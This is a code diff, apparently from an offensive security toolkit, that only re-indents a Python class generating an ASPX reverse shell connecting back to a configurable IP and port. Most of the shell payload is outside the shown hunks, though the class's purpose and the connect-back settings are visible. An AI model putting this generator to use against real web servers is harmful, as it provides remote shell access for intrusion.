@@ -2,23 +2,24 @@ from .base import ShellCode
 
 
 class AspxShellCode(ShellCode):
-    """
-        Class with shellcode for .NET language
-    """
-    def __init__(self, connect_back_ip='localhost', connect_back_port=5555,
-                 bad_chars=['\x00']):
-        ShellCode.__init__(self,
-                           connect_back_ip=connect_back_ip,
-                           connect_back_port=connect_back_port,
-                           bad_chars=bad_chars)
-
-    def get_aspx_code(self):
-        """ Function to get aspx reverse shellcode """
-        if not self.connect_back_ip or not self.connect_back_port:
-            print("Settings for connect back listener must be defined")
-            return False
-
-        aspx_code = """
+	"""
+		 Class with shellcode for .NET language
+	"""
+	
+	def __init__(self, connect_back_ip = 'localhost', connect_back_port = 5555,
+	             bad_chars = ['\x00']):
+		ShellCode.__init__(self,
+		                   connect_back_ip = connect_back_ip,
+		                   connect_back_port = connect_back_port,
+		                   bad_chars = bad_chars)
+	
+	def get_aspx_code(self):
+		""" Function to get aspx reverse shellcode """
+		if not self.connect_back_ip or not self.connect_back_port:
+			print("Settings for connect back listener must be defined")
+			return False
+		
+		aspx_code = """
         <%@ Page Language="C#" %>
         <%@ Import Namespace="System.Runtime.InteropServices" %>
         <%@ Import Namespace="System.Net" %>
@@ -74,11 +75,11 @@ class AspxShellCode(ShellCode):
             }
         </script>
         """
-        aspx_code = self.format_shellcode(aspx_code)
-        return aspx_code
-
-    def get_shellcode(self, inline=False):
-        shell = self.get_aspx_code()
-        if inline:
-            shell = self.make_inline(shell)
-        return shell
+		aspx_code = self.format_shellcode(aspx_code)
+		return aspx_code
+	
+	def get_shellcode(self, inline = False):
+		shell = self.get_aspx_code()
+		if inline:
+			shell = self.make_inline(shell)
+		return shell
